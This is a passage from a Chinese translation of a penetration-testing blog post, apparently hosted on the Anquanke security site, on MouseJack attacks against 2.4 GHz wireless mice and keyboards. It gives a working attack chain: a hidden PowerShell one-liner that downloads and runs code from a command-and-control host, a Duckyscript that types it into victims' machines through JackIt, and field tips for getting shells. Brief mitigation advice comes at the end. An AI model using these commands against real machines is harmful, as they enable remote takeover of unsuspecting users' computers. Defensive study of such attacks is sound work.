powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;-c&nbsp;IEX(new-object&nbsp;net.webclient).downloadstring(&#39;http://192.168.2.10/a&#39;);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">专业提示：如果你对PowerShell混淆技术感兴趣，请关注@danielhbohannon的文章！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，我们已经建立好C&amp;C服务器，并安放完恶意字符串。我们可以在之前阶段修改模板中的Duckyscript，只需确认做好本地备份：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:ps;toolbar:false">GUI&nbsp;r
DELAY&nbsp;300
STRING&nbsp;powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;-c&nbsp;IEX(new-object&nbsp;net.webclient).downloadstring(&#39;http://192.168.2.10/a&#39;);
DELAY&nbsp;300
ENTER
ENTER</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">使用JackIt进行漏洞利用或是监视，只需以下代码标签调用Duckyscript文件：</span></p><pre class="brush:bash;toolbar:false">/opt/jackit/$&nbsp;./jackit.py&nbsp;--script&nbsp;ducky-script.txt</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在下面的截图中，可以看到我们发现了两个经由JackIt指纹识别的无线外设。当我们需要启动鼠标劫持攻击时，只需按下CTRL-C：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p5.qhimg.com/t015e0e65339cdf2400.png" title="t015e0e65339cdf2400.png" alt="http://p5.qhimg.com/t015e0e65339cdf2400.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以选择单独的设备，或者多个设备，再或者被发现的所有设备。一旦我们选择完毕并按下ENTER键，定向攻击便会启动。根据目标设备的品牌，你将在脚本运行完成之前，从屏幕上看到很多延迟10ms的消息。当看到以下消息时，你就能得知JackIt已经运行完成：[+]已完成所有攻击。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们来查看一下Web Delivery模块，看看是否有攻击取得成功：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p2.qhimg.com/t015f17f2dc864ceba9.png" title="t015f17f2dc864ceba9.png" alt="http://p8.qhimg.com/t015f17f2dc864ceba9.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看起来我们实现了一次成功攻击！虽然我们尝试对两个目标发动鼠标劫持攻击，但只有一个成功响应。之所以其中一个攻击尝试会取得失败，我们会简要讨论造成原因。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，我们已经成功结合Metasploit的Web Delivery模块与JackIt入侵一处无线外设。我们实际上还有其他框架可以利用，制作类似的单行PowerShell，包括<a href="https://www.cobaltstrike.com/" target="_self">Cobalt Strike</a>和<a href="https://www.powershellempire.com/" target="_self">Empire</a>。可以简单讲一讲Cobalt Strike，我在进行鼠标劫持时，还喜欢使用一种非PowerShell的攻击载荷。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Cobalt Strike有一个名为<a href="https://www.cobaltstrike.com/help-scripted-web-delivery" target="_self">Scripted Web Delivery</a>的攻击手法，与 Metasploit的Web Delivery相类似，不同之处在于其提供了更多的攻击载荷选项。虽然PowerShell选项已经证明可用，我还是更偏爱<strong>regsvr32</strong>攻击荷载，因为它十分短小而实用；但是，这种攻击必须目标系统安装Microsoft Office，因为发动攻击需要使用VBA宏命令以及COM脚本段：</span></p><p style="text-align: center;"><img src="http://p4.qhimg.com/t01c20c7bd184492f69.png" title="t01c20c7bd184492f69.png" alt="http://p0.qhimg.com/t01c20c7bd184492f69.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">配置完成后，攻击载荷将类似于如下内容：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p9.qhimg.com/t01b5521db401081448.png" title="t01b5521db401081448.png" alt="http://p9.qhimg.com/t01b5521db401081448.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文中并未叙述该攻击载荷的运行原理，如果有兴趣了解，可以查看凯西•史密斯（<a href="https://twitter.com/subtee" target="_self">@subTee</a>）的<a href="http://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html" target="_self">博客文章</a>。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">继续之前，我想提一下：在成功实施攻击之后，我在再次运行JackIt时出现了问题，收到了如下错误消息：</span></p><p style="text-align: center;"><img src="http://p1.qhimg.com/t015cdeaa0804dcd0ae.png" title="t015cdeaa0804dcd0ae.png" alt="http://p1.qhimg.com/t015cdeaa0804dcd0ae.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我分别以在VMWare下运行Kali，以及单独运行Kali box两种情况重现了这个错误。如果你在其他类型的Linux上遇到此情况，请告知我。除了重新启动操作系统之外，解决此错误的唯一方法是取消绑定，然后重新将USB驱动程序和CrazyRadio PA加密狗绑定。我们可以通过拔下并重新插入CrazyRadio PA，或者通过向控制台发送一些特定的命令来实现。幸运的是，我的同事Dan Astor（@illegitimateDA）编写了一个Bash脚本为我们代劳。每当提示错误消息，只需运行以下脚本，然后就可以重新运行JackIt：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">#!/bin/bash
#Tool&nbsp;::&nbsp;USB&nbsp;device&nbsp;reset&nbsp;script&nbsp;developed&nbsp;for&nbsp;use&nbsp;with&nbsp;JackIt&nbsp;&amp;&nbsp;CrazyRadio&nbsp;PA&nbsp;USB&nbsp;Adapter
#Author&nbsp;::&nbsp;Dan&nbsp;Astor&nbsp;(@illegitimateDA)
#Usage&nbsp;::&nbsp;After&nbsp;running&nbsp;an&nbsp;attack&nbsp;with&nbsp;JackIt,&nbsp;run&nbsp;the&nbsp;script&nbsp;to&nbsp;reset&nbsp;the&nbsp;USB&nbsp;adapter.&nbsp;This&nbsp;will&nbsp;fix&nbsp;the&nbsp;USB&nbsp;Core&nbsp;Error&nbsp;Python&nbsp;throws.
#Unbind&nbsp;USB&nbsp;devices&nbsp;from&nbsp;the&nbsp;system&nbsp;and&nbsp;rebind&nbsp;them
for&nbsp;device&nbsp;in&nbsp;/sys/bus/pci/drivers/uhci_hcd/*:*;&nbsp;do
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Unbind&nbsp;the&nbsp;device
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;${device##*/}&quot;&nbsp;&gt;&nbsp;&quot;${device%/*}/unbind&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Bind&nbsp;the&nbsp;device
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;${device##*/}&quot;&nbsp;&gt;&nbsp;&quot;${device%/*}/bind&quot;
done</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我被告知会出现Shells</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">至此，我们发现并攻击了豪不知情的受害者，他们不知道加密狗的危险。但是，如果一切都不按计划运行呢？如果我们对多个外设释放攻击后，发现并没有shells在等着我们呢？很可怕！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先：我们要讨论区域范围。坦白的说，<a href="https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B00VYA3A2U&linkCode=as2&tag=jrenard-20&linkId=f5ebfa29c33f2e99d2a8ff0c2c30c79b" target="_self">CrazyRadio PA</a>附带的天线并不好用，尽管广告中吹嘘加密狗可以“远距离”进行操控。在我们的攻击字符串中，仅出现一次代码缺失或乱码情况，影响到了pwnage parade。我不止一次看到代码缺失的情况，甚至目睹了超长字符串的运行实例，充斥着正斜杠以阻止实例关闭，用户因此不得不重启受影响计算机。这些情况是不理想的，因为我们没有收到shells，而用户可能会注意到我们的攻击，我们甚至还会对用户的外设灵敏度产生负面影响（CLIENT RAGE！）。根据我的经验，我觉得很多这些问题都可以利用提高信号强度来避免。我有幸得到了Alfa天线，如<a href="https://www.amazon.com/gp/product/B002MUU6L4/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B002MUU6L4&linkCode=as2&tag=jrenard-20&linkId=89e83d10c3ced0f7e5ca958b94d15383" target="_self">9dBi Wifi Booster</a>。这个特殊选择的唯一问题是，我们需要在笔记本电脑的延伸出的一个15“天线上花费大量精力调试。我的建议是：尝试不同的选择，找到一个你认为可靠的最大范围。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二件要注意的事情是：微软的无线设备并不好惹。这是因为，与罗技外设不同，微软在设备和加密狗之间的每次通信中都使用了序列号。 JackIt能够用于监视这些序列号，但如果用户在受攻击之前执行某些操作（单击，移动鼠标等），则序列号将无法对齐，然后我们将再次发现代码缺失或乱码。虽然有时候很难搞定，但在目标使用微软外设时，我更愿意亲自“监视”目标，以等待发动攻击的理想时机。当然如果我完全无视这些条件，并将微软和罗技设备都摆在攻击范围之内，我还是会选择罗技设备作为目标。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第三个考虑是：我们应该如何构建指向我们攻击载荷的URL。我在最近的实践中吸取了教训。利用Cobalt Strike，我在一个类似于本文之前提到的URL示例（<strong>http://ip_address/a</strong>）中安放了攻击荷载。在对一个理想目标发起攻击后，我发现在C&amp;C服务器上等待不到shell。在检查Cobalt Strike的Web日志后，我看到类似于以下内容的消息：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p9.qhimg.com/t013bcabab92b181a36.png" title="t013bcabab92b181a36.png" alt="http://p9.qhimg.com/t013bcabab92b181a36.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是令人困惑的地方，为什么我的目标会登录以大写/ A结尾的网址？在我的DuckyScript文件中有没有错误的攻击字符串？经过快速检查，我排除了这种可能。然后，我突然想到...用户可能启用了大小写键！我居然犯了这么蠢的错误！从那以后，我更改了鼠标劫持所用的URL为数字（即/ 1），防止再次出现类似的问题。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，我列举了一些用户能够采取的补救措施。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">质量不好的加密狗有什么特点？</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">处理鼠标劫持问题，最简单的解决方案其实是：使用有线外设（或改为蓝牙设备）。话虽如此，如果你真的钟爱2.4 GHz设备，微软和罗技还是在受影响的产品中制定了一些缓解策略的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">微软于2016年4月发布了一项安全通告，并附有相应的可选补丁。 该补丁将在加密狗端口添加更强大的过滤手段，以便检测和处理恶意键盘操作。研究人员已经测试过该补丁的效果，但表示补丁不一定能解决所有问题，某些设备即使在安装补丁后仍然易受攻击。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">罗技采取了不同的策略，其要求用户手动进行固件更新，以解决问题。 更新过程需要多个步骤，对于专业技术掌握较少的终端用户来说十分麻烦。对于IT部门，想要面向所有用户群体进行大规模手动升级也是不切实际的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">鉴于这些事实，我认为在未来一段时间内，还是能够在企业内部发现能够实施鼠标劫持攻击的设备。 如果你也想进行相关实践，请考虑将鼠标劫持添加到自己的攻击工具箱中吧！</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://toshellandback.com/2017/08/16/mousejack/" target="_blank">原文链接：https://toshellandback.com/2017/08/16/mousejack/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】如何远程控制别人的无线鼠标：深度揭露鼠标劫持内幕 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4366" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16612" user-name="Helen" href="javascript:;">
                Helen            </a>
                        <span class="comment-time">2017-09-11 14:31:16</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16612">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16612" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">学习了......</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16558" user-name="黑衣人先生" href="javascript:;">
                黑衣人先生            </a>
                        <span class="comment-time">2017-09-07 14:41:52</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16558">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16558" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">我去试试……</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16557" user-name="黑衣人先生" href="javascript:;">
                黑衣人先生            </a>
                        <span class="comment-time">2017-09-07 14:41:31</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16557">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16557" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">我去试试……</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4366" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
